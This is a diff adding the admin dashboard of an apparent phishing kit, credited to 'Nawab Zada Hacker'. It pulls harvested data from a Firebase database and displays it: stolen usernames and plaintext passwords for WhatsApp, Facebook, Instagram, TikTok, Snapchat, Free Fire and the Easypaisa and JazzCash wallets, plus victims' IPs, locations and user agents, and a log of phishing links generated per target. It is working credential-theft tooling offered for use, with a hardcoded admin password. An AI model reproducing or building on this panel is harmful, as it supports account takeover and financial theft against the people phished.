@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+        }
+        
+        /* Login */
+        .admin-login {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .login-box {
+            background: #111;
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid #333;
+            width: 90%;
+            max-width: 400px;
+        }
+        .login-box h2 { text-align: center; color: #ff6600; margin-bottom: 30px; }
+        .login-box input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1em;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 15px;
+            background: #ff6600;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-box .error { color: #ff0000; text-align: center; margin-top: 10px; display: none; }
+        
+        /* Dashboard */
+        .dashboard { display: none; }
+        .sidebar {
+            position: fixed;
+            left: 0; top: 0; width: 250px; height: 100%;
+            background: #111;
+            border-right: 1px solid #222;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .sidebar h2 { color: #ff6600; margin-bottom: 20px; font-size: 1.2em; }
+        .sidebar .stats {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        .sidebar .stats div { margin: 5px 0; font-size: 0.9em; color: #ccc; }
+        .sidebar .stats span { color: #ff6600; font-weight: bold; }
+        
+        .main-content {
+            margin-left: 250px;
+            padding: 20px;
+        }
+        
+        .header-bar {
+            background: #111;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-bar h1 { font-size: 1.5em; }
+        .header-bar .ip-info { color: #888; font-size: 0.9em; }
+        
+        .data-section {
+            background: #111;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #222;
+        }
+        .data-section h3 { color: #ff6600; margin-bottom: 15px; }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        table th, table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #222;
+            font-size: 0.9em;
+        }
+        table th { color: #ff6600; font-weight: 600; }
+        table tr:hover { background: rgba(255,255,255,0.03); }
+        table .password { color: #00ff00; font-family: monospace; }
+        table .ip { color: #00ccff; }
+        table .time { color: #888; }
+        table .service-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.8em;
+        }
+        
+        .badge-whatsapp { background: #25D366; color: #000; }
+        .badge-tiktok { background: #ff0050; color: #fff; }
+        .badge-facebook { background: #1877F2; color: #fff; }
+        .badge-instagram { background: #E4405F; color: #fff; }
+        .badge-snapchat { background: #FFFC00; color: #000; }
+        .badge-freefire { background: #FF6600; color: #fff; }
+        .badge-easypaisa { background: #00A859; color: #fff; }
+        .badge-jazzcash { background: #ED1C24; color: #fff; }
+        .badge-twitter { background: #1DA1F2; color: #fff; }
+        
+        .visitors-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .visitor-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            border-bottom: 1px solid #222;
+            font-size: 0.85em;
+        }
+        .visitor-item .vip { color: #00ccff; }
+        .visitor-item .vtime { color: #666; }
+        
+        .refresh-btn {
+            padding: 10px 20px;
+            background: #ff6600;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+        }
+        .refresh-btn:hover { background: #ff5500; }
+        
+        @media (max-width: 768px) {
+            .sidebar { display: none; }
+            .main-content { margin-left: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-login" id="adminLogin">
+        <div class="login-box">
+            <h2>🔒 Admin Panel</h2>
+            <input type="password" id="adminPass" placeholder="Enter Admin Password">
+            <button onclick="adminLogin()">🔑 Login</button>
+            <div class="error" id="loginError">❌ Invalid Password!</div>
+        </div>
+    </div>
+    
+    <div class="dashboard" id="dashboard">
+        <div class="sidebar">
+            <h2>☠️ ADMIN PANEL</h2>
+            <div class="stats">
+                <div>👥 Total Visitors: <span id="totalVisitors">0</span></div>
+                <div>📊 Total Captures: <span id="totalCaptures">0</span></div>
+                <div>🔗 Links Generated: <span id="totalLinks">0</span></div>
+                <div>🌐 Unique IPs: <span id="uniqueIPs">0</span></div>
+            </div>
+            <div style="font-size:0.8em;color:#666;margin-top:20px;">
+                 Developer: Nawab Zada Hacker<br>
+                ☠️✌️🦅
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <div class="header-bar">
+                <div>
+                    <h1>📊 Live Dashboard</h1>
+                    <div class="ip-info">🌐 Your IP: <span id="adminIP">Detecting...</span></div>
+                </div>
+                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            </div>
+            
+            <div class="data-section">
+                <h3>🔓 Captured Credentials</h3>
+                <div style="overflow-x:auto;">
+                    <table id="capturesTable">
+                        <thead>
+                            <tr>
+                                <th>Service</th>
+                                <th>Username</th>
+                                <th>Password</th>
+                                <th>Target</th>
+                                <th>IP Address</th>
+                                <th>Location</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="capturesBody">
+                            <tr><td colspan="7" style="text-align:center;color:#666;">Loading data...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="data-section">
+                <h3>🌍 All Visitor IPs</h3>
+                <div class="visitors-list" id="visitorsList">
+                    <div style="text-align:center;color:#666;">Loading visitors...</div>
+                </div>
+            </div>
+            
+            <div class="data-section">
+                <h3>🔗 Generated Links</h3>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Service</th>
+                                <th>Target</th>
+                                <th>Generator IP</th>
+                                <th>Status</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="linksBody">
+                            <tr><td colspan="5" style="text-align:center;color:#666;">Loading links...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const ADMIN_PASSWORD = "nawabzada2026"; // 
+        
+        function adminLogin() {
+            const pass = document.getElementById('adminPass').value;
+            if (pass === ADMIN_PASSWORD) {
+                document.getElementById('adminLogin').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                loadData();
+                setInterval(loadData, 10000);
+            } else {
+                document.getElementById('loginError').style.display = 'block';
+            }
+        }
+        
+        document.getElementById('adminPass').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') adminLogin();
+        });
+        
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('adminIP').textContent = data.ip;
+            });
+        
+        function loadData() {
+            db.ref('all_captures').once('value', snapshot => {
+                const data = snapshot.val();
+                const tbody = document.getElementById('capturesBody');
+                const counts = document.getElementById('totalCaptures');
+                
+                if (!data) {
+                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#666;">No data captured yet</td></tr>';
+                    counts.textContent = '0';
+                    return;
+                }
+                
+                let html = '';
+                let count = 0;
+                const entries = Object.values(data).reverse();
+                
+                entries.forEach(item => {
+                    count++;
+                    const serviceClass = 'badge-' + (item.service || 'unknown');
+                    const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                    html += `
+                        <tr>
+                            <td><span class="service-badge ${serviceClass}">${item.service || 'Unknown'}</span></td>
+                            <td>${item.username || 'N/A'}</td>
+                            <td class="password">${item.password || 'N/A'}</td>
+                            <td>${item.target || 'N/A'}</td>
+                            <td class="ip">${item.ip || 'Unknown'}</td>
+                            <td>${item.location || 'Unknown'}</td>
+                            <td class="time">${time}</td>
+                        </tr>
+                    `;
+                });
+                
+                tbody.innerHTML = html;
+                counts.textContent = count;
+            });
+            
+            db.ref('visitors').once('value', snapshot => {
+                const data = snapshot.val();
+                const list = document.getElementById('visitorsList');
+                const totalV = document.getElementById('totalVisitors');
+                const uniqueIPs = document.getElementById('uniqueIPs');
+                
+                if (!data) {
+                    list.innerHTML = '<div style="text-align:center;color:#666;">No visitors yet</div>';
+                    totalV.textContent = '0';
+                    uniqueIPs.textContent = '0';
+                    return;
+                }
+                
+                let html = '';
+                const ips = new Set();
+                const entries = Object.values(data).reverse();
+                
+                entries.forEach(item => {
+                    if (item.ip) ips.add(item.ip);
+                    const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                    html += `
+                        <div class="visitor-item">
+                            <span class="vip">🌐 ${item.ip || 'Unknown'}</span>
+                            <span>${item.userAgent ? item.userAgent.substring(0, 40) + '...' : 'Unknown'}</span>
+                            <span class="vtime">${time}</span>
+                        </div>
+                    `;
+                });
+                
+                list.innerHTML = html;
+                totalV.textContent = entries.length;
+                uniqueIPs.textContent = ips.size;
+            });
+            
+            db.ref('generated_links').once('value', snapshot => {
+                const data = snapshot.val();
+                const tbody = document.getElementById('linksBody');
+                const totalL = document.getElementById('totalLinks');
+                
+                if (!data) {
+                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#666;">No links generated</td></tr>';
+                    totalL.textContent = '0';
+                    return;
+                }
+                
+                let html = '';
+                let count = 0;
+                const entries = Object.values(data).reverse();
+                
+                entries.forEach(item => {
+                    count++;
+                    const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                    html += `
+                        <tr>
+                            <td>${item.service || 'Unknown'}</td>
+                            <td>${item.target || 'N/A'}</td>
+                            <td class="ip">${item.generatorIP || 'Unknown'}</td>
+                            <td style="color:#0f0;">${item.status || 'active'}</td>
+                            <td class="time">${time}</td>
+                        </tr>
+                    `;
+                });
+                
+                tbody.innerHTML = html;
+                totalL.textContent = count;
+            });
+            
+            db.ref('visits').once('value', snapshot => {
+                const data = snapshot.val();
+                if (!data) return;
+                
+                const list = document.getElementById('visitorsList');
+                let extraHtml = '';
+                const allEntries = Object.entries(data);
+                
+                allEntries.forEach(([linkId, visits]) => {
+                    if (typeof visits === 'object' && visits !== null) {
+                        Object.values(visits).forEach(visit => {
+                            if (visit && visit.ip) {
+                                extraHtml += `
+                                    <div class="visitor-item">
+                                        <span class="vip">🌐 ${visit.ip || 'Unknown'}</span>
+                                        <span>${visit.page || 'Unknown'} - ${visit.target ? visit.target.substring(0,20) : 'Direct'}</span>
+                                        <span class="vtime">${visit.timestamp ? new Date(visit.timestamp).toLocaleString() : 'Unknown'}</span>
+                                    </div>
+                                `;
+                            }
+                        });
+                    }
+                });
+                
+                if (extraHtml) {
+                    list.innerHTML = extraHtml + list.innerHTML;
+                }
+            });
+        }
+    </script>
+</body>
+</html>
